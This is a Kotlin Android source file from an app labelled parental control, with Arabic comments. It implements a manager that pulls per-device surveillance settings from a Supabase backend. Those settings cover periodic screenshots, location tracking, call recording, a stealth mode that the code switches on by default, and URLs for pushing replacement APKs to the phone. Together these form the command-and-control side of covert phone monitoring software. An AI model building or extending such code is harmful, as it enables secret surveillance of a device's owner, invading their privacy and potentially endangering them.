package com.example.parentalcontrol

import android.content.Context
import android.provider.Settings
import android.util.Log
import io.github.jan.supabase.postgrest.from
import io.github.jan.supabase.postgrest.query.Columns
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.Serializable

/**
 * مدير الإعدادات عن بُعد (Remote Config Manager)
 * يقوم بجلب الإعدادات من Supabase وتطبيقها على الجهاز فوراً
 */
class RemoteConfigManager(private val context: Context) {

    companion object {
        private const val TAG = "RemoteConfig"
        private const val TABLE_NAME = "remote_settings"
    }

    private val deviceId: String by lazy {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
    }

    /**
     * جلب الإعدادات الحالية للجهاز
     */
    suspend fun fetchSettings(): AppSettings? = withContext(Dispatchers.IO) {
        try {
            val client = SupabaseManager.getInstance().getClient() ?: return@withContext null
            
            // محاولة جلب السجل الخاص بالجهاز
            val response = client.from(TABLE_NAME)
                .select(Columns.list("screenshot_interval_ms", "location_interval_ms", "record_calls", "stealth_mode_active", "target_version", "update_apk_path", "update_apk_url")) {
                    filter {
                        eq("device_id", deviceId)
                    }
                }.decodeSingleOrNull<AppSettings>()

            // إذا لم يوجد سجل، سنقوم بإنشاء سجل افتراضي للجهاز
            if (response == null) {
                initializeDefaultSettings()
                return@withContext AppSettings()
            }

            Log.i(TAG, "Remote settings fetched: $response")
            return@withContext response
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching remote settings: ${e.message}")
            null
        }
    }

    /**
     * تهيئة إعدادات افتراضية للجهاز في Supabase عند أول تشغيل
     */
    private suspend fun initializeDefaultSettings() = withContext(Dispatchers.IO) {
        try {
            val client = SupabaseManager.getInstance().getClient() ?: return@withContext
            val defaultSettings = mapOf(
                "device_id" to deviceId,
                "screenshot_interval_ms" to 60000,
                "location_interval_ms" to 600000,
                "record_calls" to false,
                "stealth_mode_active" to true
            )
            client.from(TABLE_NAME).insert(defaultSettings)
            Log.i(TAG, "Default settings initialized for device: $deviceId")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize default settings: ${e.message}")
        }
    }
}

/**
 * نموذج بيانات الإعدادات
 */
@Serializable
data class AppSettings(
    val screenshot_interval_ms: Long = 60000,
    val location_interval_ms: Long = 600000, // 10 minutes default
    val record_calls: Boolean = false,
    val stealth_mode_active: Boolean = true,
    val target_version: Int = 1,
    val update_apk_path: String? = null,  // مسار Supabase Storage
    val update_apk_url: String? = null    // رابط HTTP مباشر (الأولوية عند وجوده)
)
